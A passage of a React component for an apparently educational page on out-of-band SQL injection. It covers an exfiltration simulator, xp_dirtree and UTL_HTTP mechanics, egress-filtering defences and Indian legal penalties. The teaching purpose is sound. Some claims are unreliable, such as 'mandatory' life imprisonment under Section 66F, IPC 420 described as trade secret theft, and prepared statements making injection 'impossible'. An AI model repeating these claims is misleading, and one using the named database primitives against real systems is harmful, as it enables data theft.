          <div className="border-b border-gray-800 pb-4">
            <span className="text-xs font-bold uppercase tracking-wider text-indigo-400">
              Interactive Concept Studio 1
            </span>
            <h2 className="text-xl sm:text-2xl font-bold text-white mt-1">
              3. Out-of-Band Protocol &amp; Dialect Pattern Inspector
            </h2>
            <p className="text-sm text-gray-300 mt-2">
              Select an Out-of-Band SQL injection protocol or mechanism below to examine its dialect pattern, vulnerability mechanics, 
              mitigation patterns, typical exploit payloads, and code syntax:
            </p>
          </div>

          {/* Selector Grid */}
          <div className="grid grid-cols-2 sm:grid-cols-4 lg:grid-cols-8 gap-2">
            {Object.values(oobDatabase).map((item) => (
              <button
                key={item.key}
                onClick={() => setSelectedOobKey(item.key)}
                className={clsx(
                  "p-3 rounded-xl border text-left transition-all duration-300 flex flex-col justify-between text-xs space-y-2",
                  selectedOobKey === item.key
                    ? "bg-rose-950/80 border-rose-500 shadow-lg shadow-rose-950/50"
                    : "bg-[#0c101c] border-gray-800 hover:border-gray-700 text-gray-400 hover:text-gray-200"
                )}
              &gt;
                <span className="text-[8.5px] font-bold px-1.5 py-0.5 rounded border bg-rose-950 text-rose-300 border-rose-800 self-start">
                  OOB
                </span>
                <span className="font-bold text-white text-[11px] leading-tight line-clamp-2">{item.name}</span>
              </button>
            ))}
          </div>

          {/* Active Detail Box */}
          <div className="bg-[#070b14] p-5 sm:p-6 rounded-xl border border-gray-800 space-y-6">
            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 border-b border-gray-800 pb-4">
              <div>
                <div className="flex items-center gap-2 flex-wrap">
                  <span className={clsx("text-xs font-bold px-2.5 py-0.5 rounded border", activeOob.categoryBadge)}>
                    {activeOob.category}
                  </span>
                  <span className="text-xs px-2.5 py-0.5 rounded bg-gray-900 border border-gray-800 text-cyan-400 font-mono">
                    Target: {activeOob.targetEngine}
                  </span>
                  <span className="text-xs px-2.5 py-0.5 rounded bg-amber-950/80 border border-amber-800 text-amber-300 font-mono text-[11px]">
                    Payload: {activeOob.typicalPayload}
                  </span>
                </div>
                <h3 className="text-lg font-bold text-white mt-2">{activeOob.name}</h3>
              </div>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-2 gap-5 text-xs">
              <div className="space-y-4">
                <div className="bg-gray-950 p-4 rounded-lg border border-gray-800 space-y-1.5">
                  <span className="font-bold text-rose-400 uppercase tracking-wider text-[10px] block">
                    Vulnerability Mechanics &amp; Outbound Sockets
                  </span>
                  <p className="text-gray-300 leading-relaxed">{activeOob.vulnerabilityMechanism}</p>
                </div>

                <div className="bg-gray-950 p-4 rounded-lg border border-gray-800 space-y-1.5">
                  <span className="font-bold text-emerald-400 uppercase tracking-wider text-[10px] block">
                    Enterprise Mitigation Pattern
                  </span>
                  <p className="text-gray-300 leading-relaxed font-semibold">{activeOob.mitigationPattern}</p>
                </div>
              </div>

              <div className="space-y-4">
                <div className="bg-gray-950 p-4 rounded-lg border border-gray-800 space-y-1.5">
                  <span className="font-bold text-indigo-400 uppercase tracking-wider text-[10px] block">
                    Execution Syntax &amp; DNS Label Blueprint
                  </span>
                  <pre className="bg-black/90 p-3 rounded font-mono text-[11px] text-indigo-200 overflow-x-auto whitespace-pre-wrap border border-indigo-950/50">
                    {activeOob.codeSnippet}
                  </pre>
                </div>
              </div>
            </div>
          </div>
        </section>

        {/* SECTION 4: Studio 2 - Live OOB DNS Exfiltration Simulator */}
        <section className="bg-gray-900/90 rounded-2xl border border-gray-800 p-6 sm:p-8 space-y-6 shadow-xl">
          <div className="border-b border-gray-800 pb-4">
            <span className="text-xs font-bold uppercase tracking-wider text-emerald-400">
              Interactive Concept Studio 2
            </span>
            <h2 className="text-xl sm:text-2xl font-bold text-white mt-1">
              4. Out-of-Band DNS Exfiltration &amp; Packet Analyzer Laboratory
            </h2>
            <p className="text-sm text-gray-300 mt-2">
              Select the Target Database Engine, Data Secret Category, Encoding Scheme, and toggle Database Subnet Egress Firewall 
              to observe live recursive DNS packet generation and authoritative nameserver reception:
            </p>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
            {/* Input Controls */}
            <div className="bg-[#050811] p-5 rounded-xl border border-gray-800 space-y-4 text-xs">
              <h3 className="font-bold text-white uppercase tracking-wider text-[11px]">OOB Attack Parameters</h3>

              <div className="space-y-1">
                <span className="text-gray-400 block">1. Database RDBMS Engine:</span>
                <div className="grid grid-cols-2 gap-1.5">
                  {["mssql", "oracle", "mysql", "postgresql"].map((eng) => (
                    <button
                      key={eng}
                      onClick={() => setDatabaseEngine(eng)}
                      className={clsx(
                        "p-2 rounded border font-bold text-[10px] uppercase transition-all",
                        databaseEngine === eng
                          ? "bg-rose-950 border-rose-500 text-rose-300"
                          : "bg-gray-950 border-gray-800 text-gray-400"
                      )}
                    &gt;
                      {eng}
                    </button>
                  ))}
                </div>
              </div>

              <div className="space-y-1 pt-1 border-t border-gray-800">
                <span className="text-gray-400 block">2. Target Data Secret:</span>
                <div className="grid grid-cols-1 gap-1.5">
                  {[
                    { id: "admin_password_hash", label: "Admin Password Hash ($2b$12$...)" },
                    { id: "rtgs_settlement_keys", label: "RTGS Settlement Keys (Financial)" },
                    { id: "oncology_patient_records", label: "Oncology Diagnosis (Health Data)" }
                  ].map((sec) => (
                    <button
                      key={sec.id}
                      onClick={() => setTargetDataCategory(sec.id)}
                      className={clsx(
                        "p-2 rounded border font-bold text-[10px] text-left transition-all",
                        targetDataCategory === sec.id
                          ? "bg-purple-950 border-purple-500 text-purple-300"
                          : "bg-gray-950 border-gray-800 text-gray-400"
                      )}
                    &gt;
                      {sec.label}
                    </button>
                  ))}
                </div>
              </div>

              <div className="space-y-1 pt-1 border-t border-gray-800">
                <span className="text-gray-400 block">3. DNS Label Encoding Scheme:</span>
                <div className="grid grid-cols-2 gap-1.5">
                  {[
                    { id: "hex_encoded", label: "Hex (0x...)" },
                    { id: "base32_encoded", label: "Base32" }
                  ].map((enc) => (
                    <button
                      key={enc.id}
                      onClick={() => setEncodingScheme(enc.id)}
                      className={clsx(
                        "p-2 rounded border font-bold text-[10px] transition-all",
                        encodingScheme === enc.id
                          ? "bg-cyan-950 border-cyan-500 text-cyan-300"
                          : "bg-gray-950 border-gray-800 text-gray-400"
                      )}
                    &gt;
                      {enc.label}
                    </button>
                  ))}
                </div>
              </div>

              <div className="space-y-1 pt-1 border-t border-gray-800">
                <span className="text-gray-400 block">4. Database Network Egress Firewall:</span>
                <button
                  onClick={() => setEgressFirewallActive(!egressFirewallActive)}
                  className={clsx(
                    "w-full p-2.5 rounded-lg border font-bold text-xs transition-all",
                    egressFirewallActive
                      ? "bg-emerald-950 border-emerald-500 text-emerald-300 shadow-md shadow-emerald-950/50"
                      : "bg-gray-950 border-gray-800 text-gray-400"
                  )}
                &gt;
                  {egressFirewallActive ? "✔ EGRESS FIREWALL ACTIVE (Drop Outbound Port 53)" : "UNRESTRICTED EGRESS (Outbound Port 53 Open)"}
                </button>
              </div>
            </div>

            {/* Calculated Output Metrics & Packet Log Box */}
            <div className="bg-[#050811] p-5 rounded-xl border border-gray-800 col-span-1 md:col-span-2 space-y-4 text-xs">
              <div className="flex justify-between items-center border-b border-gray-800 pb-2">
                <h3 className="font-bold text-white uppercase tracking-wider text-[11px]">Authoritative DNS Listener Console</h3>
                <span className="text-xs px-2.5 py-0.5 rounded bg-gray-900 border border-gray-800 text-emerald-400 font-mono">
                  Throughput: {simulationResults.throughputBytesSec} B/s
                </span>
              </div>

              <div className="bg-gray-950 p-3 rounded-lg border border-gray-800 space-y-1.5">
                <span className="text-gray-400 text-[10px] uppercase block">Constructed Dialect Injection Query:</span>
                <pre className="p-2.5 bg-black/90 rounded font-mono text-[11px] text-cyan-300 overflow-x-auto whitespace-pre-wrap border border-cyan-950/60">
                  {simulationResults.constructedPayload}
                </pre>
              </div>

              <div className="bg-gray-950 p-3 rounded-lg border border-gray-800 space-y-1.5">
                <span className="text-gray-400 text-[10px] uppercase block">Outbound DNS Recursive Lookup Packet (UDP Port 53):</span>
                <pre className={clsx("p-2.5 rounded font-mono text-xs overflow-x-auto whitespace-pre-wrap border", simulationResults.exfiltrationSuccess ? "bg-rose-950/30 text-rose-300 border-rose-800" : "bg-emerald-950/30 text-emerald-300 border-emerald-800")}>
                  {simulationResults.exfiltrationSuccess
                    ? `[DNS QUERY RECEIVED] TYPE: A | NAME: ${simulationResults.simulatedDomain} | RTT: ${simulationResults.rttMs}ms | EXFILTRATED DATA: "${simulationResults.rawSecret}"`
                    : `[FIREWALL BLOCKED] UDP 10.0.2.15:53 ➔ ${simulationResults.simulatedDomain} | ACTION: DROPPED BY EGRESS FIREWALL RULE`}
                </pre>
              </div>

              <div className={clsx("p-4 rounded-lg border font-mono text-xs", simulationResults.badgeClass)}>
                <span className="font-bold block uppercase tracking-wider text-[10px]">OOB Network Telemetry Assessment:</span>
                <p className="mt-1 font-extrabold text-sm leading-relaxed">{simulationResults.statusMessage}</p>
              </div>
            </div>
          </div>
        </section>

        {/* SECTION 5: Studio 4 - OOB Hardening Code Studio */}
        <section className="bg-gray-900/90 rounded-2xl border border-gray-800 p-6 sm:p-8 space-y-6 shadow-xl">
          <div className="border-b border-gray-800 pb-4">
            <span className="text-xs font-bold uppercase tracking-wider text-purple-400">
              Egress Filtering &amp; Stored Procedure Revocation Studio
            </span>
            <h2 className="text-xl sm:text-2xl font-bold text-white mt-1">
              5. Production Iptables Egress Filtering, MSSQL Procedure Revocation &amp; Prepared Statement Studio
            </h2>
            <p className="text-sm text-gray-300 mt-2">
              Explore production implementations of Linux iptables database egress filtering, 
              MSSQL `xp_dirtree` permission revocation, and Node.js parameterized queries:
            </p>
          </div>

          <div className="grid grid-cols-1 sm:grid-cols-3 gap-2">
            {Object.entries(codeDatabase).map(([key, item]) => (
              <button
                key={key}
                onClick={() => setActiveCodeTab(key)}
                className={clsx(
                  "p-3 rounded-xl border text-left transition-all duration-300 text-xs font-bold",
                  activeCodeTab === key
                    ? "bg-purple-950 border-purple-500 text-purple-300 shadow-md shadow-purple-950/50"
                    : "bg-[#0b101c] border-gray-800 hover:border-gray-700 text-gray-400"
                )}
              &gt;
                {item.name}
              </button>
            ))}
          </div>

          <div className="bg-[#050811] p-5 sm:p-6 rounded-xl border border-gray-800 space-y-4">
            <div className="flex items-center justify-between border-b border-gray-800 pb-3">
              <h3 className="text-sm font-bold text-white">{activeCode.name}</h3>
              <span className="text-xs px-2.5 py-0.5 rounded bg-gray-900 border border-gray-800 text-purple-400 font-mono">
                Production Pattern
              </span>
            </div>

            <p className="text-xs text-gray-300">{activeCode.explanation}</p>

            <pre className="bg-black/90 p-4 rounded-lg font-mono text-xs text-purple-200 overflow-x-auto whitespace-pre-wrap border border-purple-950/50">
              {activeCode.code}
            </pre>
          </div>
        </section>

        {/* SECTION 6: Studio 3 - Regional West Bengal Pedagogical Case Studies */}
        <section className="bg-gray-900/90 rounded-2xl border border-gray-800 p-6 sm:p-8 space-y-6 shadow-xl">
          <div className="border-b border-gray-800 pb-4">
            <span className="text-xs font-bold uppercase tracking-wider text-amber-400">
              Regional Engineering Applications
            </span>
            <h2 className="text-xl sm:text-2xl font-bold text-white mt-1">
              6. West Bengal Field Case Studies: Kolkata, Barrackpore, Ichapur &amp; Jadavpur
            </h2>
            <p className="text-sm text-gray-300 mt-2">
              Explore how cybersecurity leaders Mamata, Debangshu, Mahima, and Susmita block DNS exfiltration in Salt Lake, 
              revoke Oracle network packages in Barrackpore, and secure oncology records in Ichapur:
            </p>
          </div>

          {/* Scenario Tabs */}
          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3">
            {localScenarios.map((sc) => (
              <button
                key={sc.id}
                onClick={() => setActiveScenarioId(sc.id)}
                className={clsx(
                  "p-4 rounded-xl border text-left transition-all duration-300 space-y-2",
                  activeScenarioId === sc.id
                    ? "bg-amber-950/60 border-amber-500 shadow-md"
                    : "bg-[#0b101c] border-gray-800 hover:border-gray-700 text-gray-400"
                )}
              &gt;
                <span className="text-[10px] font-bold px-2 py-0.5 rounded bg-gray-900 text-amber-300 border border-amber-800">
                  {sc.lead} · {sc.location.split(" ")[0]}
                </span>
                <h4 className="text-xs font-bold text-white line-clamp-1">{sc.title}</h4>
                <p className="text-[11px] text-gray-400 line-clamp-1">{sc.threatType}</p>
              </button>
            ))}
          </div>

          {/* Active Scenario Detailed Breakdown */}
          <div className="bg-[#070b14] p-6 rounded-xl border border-gray-800 space-y-5">
            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2 border-b border-gray-800 pb-3">
              <div>
                <span className="text-xs font-bold text-amber-400 uppercase tracking-wider">
                  {activeScenario.location}
                </span>
                <h3 className="text-base sm:text-lg font-bold text-white mt-0.5">{activeScenario.title}</h3>
              </div>
              <div className="text-right text-xs">
                <span className="text-gray-400 block">Lead Architect: {activeScenario.lead}</span>
                <span className="font-semibold text-emerald-400">Security Budget: {activeScenario.budget}</span>
              </div>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-2 gap-5 text-xs">
              <div className="bg-gray-950 p-4 rounded-lg border border-gray-800 space-y-2">
                <span className="font-bold text-rose-400 uppercase tracking-wider text-[10px]">
                  The Incident &amp; OOB Exfiltration Vector
                </span>
                <p className="text-gray-300 leading-relaxed">{activeScenario.incident}</p>
              </div>

              <div className="bg-gray-950 p-4 rounded-lg border border-gray-800 space-y-2">
                <span className="font-bold text-emerald-400 uppercase tracking-wider text-[10px]">
                  Architectural Defense &amp; Resolution
                </span>
                <p className="text-gray-300 leading-relaxed">{activeScenario.defenseStrategy}</p>
              </div>
            </div>

            {/* Metrics Dashboard */}
            <div className="bg-[#050811] p-4 rounded-lg border border-gray-800 grid grid-cols-2 sm:grid-cols-4 gap-3 text-center">
              {Object.entries(activeScenario.metrics).map(([key, val]) => (
                <div key={key} className="bg-gray-950 p-2.5 rounded border border-gray-800/80">
                  <span className="text-[10px] text-gray-400 uppercase tracking-wider block capitalize">
                    {key.replace(/([A-Z])/g, " $1")}
                  </span>
                  <span className="text-xs sm:text-sm font-extrabold text-white mt-1 block">{val}</span>
                </div>
              ))}
            </div>
          </div>
        </section>

        {/* SECTION 7: Statutory & Legal Frameworks in India */}
        <section className="bg-gray-900/90 rounded-2xl border border-gray-800 p-6 sm:p-8 space-y-6 shadow-xl">
          <div className="border-b border-gray-800 pb-4">
            <span className="text-xs font-bold uppercase tracking-wider text-purple-400">
              Statutory Jurisprudence
            </span>
            <h2 className="text-xl sm:text-2xl font-bold text-white mt-1">
              7. Legal Penalties for Out-of-Band SQL Injection Attacks in India
            </h2>
            <p className="text-sm text-gray-300 mt-2">
              Indian cyber law, critical infrastructure protection mandates, and personal data protection statutes 
              strictly penalize executing Out-of-Band SQL injection with severe civil compensation liabilities and life imprisonment:
            </p>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-3 gap-5 text-xs">
            <div className="bg-gray-950 p-5 rounded-xl border border-rose-950 space-y-3">
              <span className="text-xs font-bold text-rose-400 uppercase tracking-wider block">
                IT Act 2000 Section 66F
              </span>
              <ul className="space-y-2 text-gray-300">
                <li>
                  <strong className="text-white">Cyber Terrorism:</strong> OOB SQLi attacks exfiltrating critical power/banking systems carry <span className="text-rose-400 font-bold">LIFE IMPRISONMENT</span>.
                </li>
              </ul>
            </div>

            <div className="bg-gray-950 p-5 rounded-xl border border-blue-950 space-y-3">
              <span className="text-xs font-bold text-blue-400 uppercase tracking-wider block">
                IT Act Section 43(a) &amp; 70
              </span>
              <ul className="space-y-2 text-gray-300">
                <li>
                  <strong className="text-white">Section 43(a):</strong> Civil damages up to <span className="text-rose-400 font-bold">₹1 CRORE</span> for unauthorized database extraction.
                </li>
                <li>
                  <strong className="text-white">Section 70:</strong> Protected Systems attack (Up to 10 years prison).
                </li>
              </ul>
            </div>

            <div className="bg-gray-950 p-5 rounded-xl border border-emerald-950 space-y-3">
              <span className="text-xs font-bold text-emerald-400 uppercase tracking-wider block">
                DPDP Act 2023 &amp; IPC 420
              </span>
              <ul className="space-y-2 text-gray-300">
                <li>
                  <strong className="text-white">DPDP Section 33:</strong> Fines up to <span className="text-rose-400 font-bold">₹250 CRORES</span> for failing to prevent database breaches.
                </li>
                <li>
                  <strong className="text-white">IPC Section 420:</strong> Commercial trade secret theft (Up to 7 years prison).
                </li>
              </ul>
            </div>
          </div>
        </section>

        {/* SECTION 8: Common Pitfalls, Pro Tips, Thinking Hints & Mini Checklist */}
        <section className="bg-gray-900/90 rounded-2xl border border-gray-800 p-6 sm:p-8 space-y-6 shadow-xl">
          <div className="border-b border-gray-800 pb-4">
            <span className="text-xs font-bold uppercase tracking-wider text-purple-400">
              Exam &amp; Professional Mastery
            </span>
            <h2 className="text-xl sm:text-2xl font-bold text-white mt-1">
              8. Common Pitfalls, Industry Best Practices &amp; Key Hints
            </h2>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-3 gap-5 text-xs">
            {/* Common Pitfalls */}
            <div className="bg-gray-950 p-4 rounded-xl border border-rose-950/60 space-y-3">
              <span className="font-bold text-rose-400 uppercase tracking-wider text-[10px] block">
                Common Beginner Mistakes
              </span>
              <ul className="space-y-2 text-gray-300 list-disc list-inside">
                <li>
                  <strong>Leaving Outbound DNS Egress Open on Database Subnets:</strong> Allows `xp_dirtree` to exfiltrate data!
                </li>
                <li>
                  <strong>Granting `PUBLIC` Rights to `xp_dirtree` and `UTL_HTTP`:</strong> Enables non-admin attackers to invoke network packages.
                </li>
                <li>
                  <strong>Exceeding 63-Character DNS Label Limits:</strong> Injected subdomains fail if not chunked under RFC 1035.
                </li>
              </ul>
            </div>

            {/* Professional Tips */}
            <div className="bg-gray-950 p-4 rounded-xl border border-emerald-950/60 space-y-3">
              <span className="font-bold text-emerald-400 uppercase tracking-wider text-[10px] block">
                Professional Tips &amp; Tricks
              </span>
              <ul className="space-y-2 text-gray-300 list-disc list-inside">
                <li>
                  <strong>Drop Outbound Ports (53, 80, 443, 445) from DB Subnets:</strong> Completely blocks OOB socket creation.
                </li>
                <li>
                  <strong>Revoke `master..xp_dirtree` from `PUBLIC`:</strong> Restricts procedure execution to `sysadmin`.
                </li>
                <li>
                  <strong>Deploy 100% Parameterized Prepared Statements:</strong> Pre-compiles the AST, making procedure injection impossible.
                </li>
              </ul>
            </div>

            {/* Hint Section */}
            <div className="bg-gray-950 p-4 rounded-xl border border-indigo-950/60 space-y-3">
              <span className="font-bold text-indigo-400 uppercase tracking-wider text-[10px] block">
                Pedagogical Thinking Hints
              </span>
              <ul className="space-y-2 text-gray-300">
                <li className="p-2 bg-gray-900 rounded border border-gray-800">
                  <span className="text-indigo-300 font-bold block">Think about...</span>
                  Why does DNS exfiltration effortlessly bypass enterprise firewalls that block HTTP and SMB traffic?
                </li>
                <li className="p-2 bg-gray-900 rounded border border-gray-800">
                  <span className="text-indigo-300 font-bold block">Observe carefully...</span>
                  How does setting strict database subnet egress firewall rules neutralize OOB SQLi even if a query is vulnerable?
                </li>
                <li className="p-2 bg-gray-900 rounded border border-gray-800">
                  <span className="text-indigo-300 font-bold block">Try changing this...</span>
                  In the laboratory above, toggle Database Network Egress Firewall ON and observe outbound DNS packets get dropped!
                </li>
              </ul>
            </div>
          </div>

          {/* Mini Checklist */}
          <div className="bg-gray-950 p-5 rounded-xl border border-gray-800 space-y-3">
            <h3 className="text-xs font-bold text-white uppercase tracking-wider text-rose-400">
              Student Mini Checklist (Exam &amp; Career Essentials)
            </h3>
            <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-2.5 text-xs text-gray-300">
              <div className="flex items-center gap-2 p-2.5 bg-gray-900 rounded border border-gray-800">
                <span className="text-emerald-400">✔</span>
                <span>OOB SQLi coerces the database to initiate outbound DNS or HTTP network requests.</span>
              </div>
              <div className="flex items-center gap-2 p-2.5 bg-gray-900 rounded border border-gray-800">
                <span className="text-emerald-400">✔</span>
                <span>MSSQL `xp_dirtree` and Oracle `UTL_INADDR` exfiltrate data inside DNS subdomain labels.</span>
              </div>
              <div className="flex items-center gap-2 p-2.5 bg-gray-900 rounded border border-gray-800">
                <span className="text-emerald-400">✔</span>
                <span>DNS exfiltration bypasses inbound firewalls by recursing through internal corporate DNS servers.</span>
              </div>
              <div className="flex items-center gap-2 p-2.5 bg-gray-900 rounded border border-gray-800">
                <span className="text-emerald-400">✔</span>
                <span>RFC 1035 limits single DNS subdomain labels to a maximum of 63 characters.</span>
              </div>
              <div className="flex items-center gap-2 p-2.5 bg-gray-900 rounded border border-gray-800">
                <span className="text-emerald-400">✔</span>
                <span>Blocking outbound network egress (Ports 53, 80, 445) from database subnets neutralizes OOB attacks.</span>
              </div>
              <div className="flex items-center gap-2 p-2.5 bg-gray-900 rounded border border-gray-800">
                <span className="text-emerald-400">✔</span>
                <span>Section 66F of the IT Act penalizes OOB SQL injection cyber terrorism with Life Imprisonment.</span>
              </div>
            </div>
          </div>
        </section>

        {/* SECTION 9: FAQ Template */}
        <section className="space-y-4">
          <FAQTemplate
            title="Out-of-Band SQL Injection (OOB) FAQs"
            subtitle="30 Moderate to Expert Practice Questions & OOB Protocol Deep Dives"
            questions={questions}
          />
        </section>

        {/* SECTION 10: PlainTextPrint Component */}
        <section className="space-y-4">
          <PlainTextPrint
            content={noteText}
            title="Out-of-Band (OOB) SQL Injection (Printable Study Guide)"
            stampEnabled={true}
            showDownload={true}
            downloadButtonText="Download Note"
            downloadFileName="topic5_note.txt"
          />
        </section>

        {/* SECTION 11: Dedicated Teacher's Note */}
        <section className="pt-4">
          <Teacher
            note="Teacher's Note: Out-of-Band (OOB) SQL Injection represents the ultimate high-speed exfiltration vector when UI reflection and database error messages are completely absent! Master how database engines initiate outbound network sockets: understand MSSQL `xp_dirtree` UNC path resolution, Oracle `UTL_HTTP` and `UTL_INADDR`, and MySQL Windows `LOAD_FILE()`. Understand why DNS exfiltration is so dangerous: because enterprise firewalls almost always allow internal DNS recursion (UDP Port 53) to reach the internet, attackers exfiltrate 63-byte Hex chunks in 100 milliseconds, making OOB 22,500 times faster than slow time-based blind injection. Implement defense-in-depth: 1. Deploy 100% Parameterized Prepared Statements; 2. Enforce strict Database Subnet Egress Filtering dropping all outbound traffic to the public internet (Ports 53, 80, 443, 445); 3. Revoke execute permissions on `master..xp_dirtree` and `UTL_HTTP` from `PUBLIC`; 4. Implement Split-Horizon DNS. Remember that Section 66F of the Indian IT Act penalizes Out-of-Band SQL injection cyber terrorism against critical national infrastructure with mandatory Life Imprisonment, and Section 43(a) provides civil damages up to ₹1 Crore for unauthorized database extraction!"
          />
        </section>

      </div>
    </div>
  );
};

export default Topic5;
